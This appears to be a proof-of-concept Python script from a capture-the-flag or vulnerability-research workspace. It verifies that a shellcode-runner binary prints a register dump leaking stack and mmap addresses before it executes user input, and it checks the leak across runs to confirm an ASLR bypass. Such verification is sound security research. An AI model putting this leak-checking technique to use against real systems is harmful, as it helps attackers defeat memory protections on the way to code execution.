#!/usr/bin/env python3
"""
BUG-003: REGISTER_STATE_INFORMATION_LEAK_BEFORE_SHELLCODE_EXECUTION
Primitive: INFO_LEAK

This PoC verifies that the binary leaks register state (including stack addresses
rbp, rsp, r11 and a stack-pointer value in rbx) to stdout before executing
user-controlled shellcode via 'call rax' at 0x401b4b.

The leak is printed via _IO_printf at 0x401afb with format string at 0x498070:
  "Before running the shellcode:\nrax = %p\nrbx = 0x%lx\nrcx = 0x%lx\nrdx = 0x%lx\nrbp = 0x%lx\nrsp = 0x%lx\nrsi = 0x%lx\nrdi = 0x%lx\nr8 = 0x%lx\nr9 = 0x%lx\nr10 = 0x%lx\nr11 = 0x%lx\nr12 = 0x%lx\nr13 = 0x%lx\n"

Verification:
  PRIM-001 (INFO_LEAK): Confirm that stack addresses (rbp, rsp, r11) are leaked
    to stdout, that they vary across runs (ASLR is on), and that the leaked
    values are valid stack addresses (pointing into the stack region).
"""

import subprocess
import re
import sys

BINARY = "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"

def run_and_capture(stdin_input):
    """Run the binary with given stdin, capture stdout."""
    proc = subprocess.run(
        [BINARY],
        input=stdin_input,
        capture_output=True,
        timeout=10
    )
    return proc.stdout, proc.stderr, proc.returncode

def parse_registers(stdout_bytes):
    """Parse the register dump from stdout."""
    text = stdout_bytes.decode('latin-1')
    regs = {}
    # Pattern: regname = 0xVALUE
    pattern = r'(r\w+)\s*=\s*(0x[0-9a-fA-F]+)'
    for match in re.finditer(pattern, text):
        reg_name = match.group(1)
        reg_value = int(match.group(2), 16)
        regs[reg_name] = reg_value
    return regs

def run_leak_test():
    """Run the binary multiple times and collect leaked register values."""
    results = []
    # Use "AAAA" as input - passes is_all_upper filter (all uppercase)
    # The shellcode will crash (SIGSEGV) but the register dump is printed before execution
    stdin_input = b"AAAA\n"
    
    for i in range(3):
        stdout, stderr, rc = run_and_capture(stdin_input)
        regs = parse_registers(stdout)
        results.append(regs)
        print(f"  Run {i+1}: rc={rc}, regs={ {k: hex(v) for k,v in regs.items()} }")
    
    return results

def verify_info_leak(results):
    """Verify the INFO_LEAK primitive."""
    print("\n=== PRIM-001: INFO_LEAK Verification ===\n")
    
    if not results or not results[0]:
        print("FAIL: No register values captured")
        return False
    
    regs = results[0]
    
    # Check 1: Stack addresses are leaked (rbp, rsp, r11)
    stack_regs = ['rbp', 'rsp', 'r11']
    leaked_stack_addrs = {}
    for reg in stack_regs:
        if reg in regs:
            val = regs[reg]
            # Stack addresses on x86-64 Linux are typically 0x7fff........
            if 0x7f0000000000 <= val <= 0x7fffffffffff:
                leaked_stack_addrs[reg] = val
                print(f"  [OK] {reg} = 0x{val:x} - valid stack address leaked")
            else:
                print(f"  [WARN] {reg} = 0x{val:x} - not in typical stack range")
        else:
            print(f"  [FAIL] {reg} not found in output")
    
    # Check 2: rbx also contains a stack address
    if 'rbx' in regs:
        rbx_val = regs['rbx']
        if 0x7f0000000000 <= rbx_val <= 0x7fffffffffff:
            print(f"  [OK] rbx = 0x{rbx_val:x} - additional stack address leaked")
            leaked_stack_addrs['rbx'] = rbx_val
        else:
            print(f"  [INFO] rbx = 0x{rbx_val:x} - not a stack address (value: {rbx_val})")
    
    # Check 3: mmap buffer address leaked (rax)
    if 'rax' in regs:
        rax_val = regs['rax']
        if rax_val == 0x13370000:
            print(f"  [OK] rax = 0x{rax_val:x} - mmap buffer address leaked (fixed)")
        else:
            print(f"  [INFO] rax = 0x{rax_val:x}")
    
    # Check 4: ASLR is on - stack addresses vary across runs
    print("\n  --- ASLR Verification (stack addresses across runs) ---")
    aslr_confirmed = False
    if len(results) >= 2:
        rsp_values = [r.get('rsp', 0) for r in results]
        rbp_values = [r.get('rbp', 0) for r in results]
        
        print(f"  rsp values: {[hex(v) for v in rsp_values]}")
        print(f"  rbp values: {[hex(v) for v in rbp_values]}")
        
        # Check if values differ across runs (ASLR)
        if len(set(rsp_values)) > 1 or len(set(rbp_values)) > 1:
            aslr_confirmed = True
            print(f"  [OK] ASLR confirmed: stack addresses vary across runs")
        else:
            print(f"  [INFO] Stack addresses identical across runs (ASLR may be off in this env)")
    else:
        print(f"  [SKIP] Need >=2 runs for ASLR check")
    
    # Check 5: Leaked stack addresses are consistent with each other
    print("\n  --- Stack address consistency ---")
    if 'rbp' in leaked_stack_addrs and 'rsp' in leaked_stack_addrs:
        rbp = leaked_stack_addrs['rbp']
        rsp = leaked_stack_addrs['rsp']
        diff = rbp - rsp
        print(f"  rbp - rsp = 0x{diff:x} ({diff} bytes)")
        if 0 < diff < 0x10000:
            print(f"  [OK] rbp and rsp are within reasonable stack frame distance")
    
    # Check 6: r11 == rsp (both are stack pointer)
    if 'r11' in leaked_stack_addrs and 'rsp' in leaked_stack_addrs:
        if leaked_stack_addrs['r11'] == leaked_stack_addrs['rsp']:
            print(f"  [OK] r11 == rsp = 0x{leaked_stack_addrs['rsp']:x} (redundant stack leak)")
    
    # Final verdict
    print("\n  --- Verdict ---")
    stack_leaked = len(leaked_stack_addrs) >= 2
    
    if stack_leaked:
        print(f"  === PRIM-001: VERIFIED ===")
        print(f"  Leaked stack addresses: { {k: hex(v) for k,v in leaked_stack_addrs.items()} }")
        print(f"  ASLR bypass: {'YES (addresses vary across runs)' if aslr_confirmed else 'N/A (ASLR off in test env, but leak still present)'}")
        print(f"  Leak source: _IO_printf at 0x401afb with format at 0x498070")
        print(f"  Leaked values: rax(mmap_buf), rbx(stack ptr), rbp(frame ptr), rsp(stack ptr), r11(stack ptr)")
        return True
    else:
        print(f"  === PRIM-001: NOT VERIFIED ===")
        return False

def main():
    print("BUG-003: REGISTER_STATE_INFORMATION_LEAK Verification")
    print("=" * 60)
    print(f"Binary: {BINARY}")
    print(f"Input: 'AAAA\\n' (passes is_all_upper filter)")
    print(f"Expected: Register dump printed to stdout before shellcode execution")
    print()
    
    print("Step 1: Running binary 3 times to capture register leaks...")
    results = run_leak_test()
    
    print("\nStep 2: Verifying INFO_LEAK primitive...")
    verified = verify_info_leak(results)
    
    if verified:
        print("\n[+] INFO_LEAK primitive VERIFIED")
        sys.exit(0)
    else:
        print("\n[-] INFO_LEAK primitive NOT VERIFIED")
        sys.exit(1)

if __name__ == "__main__":
    main()
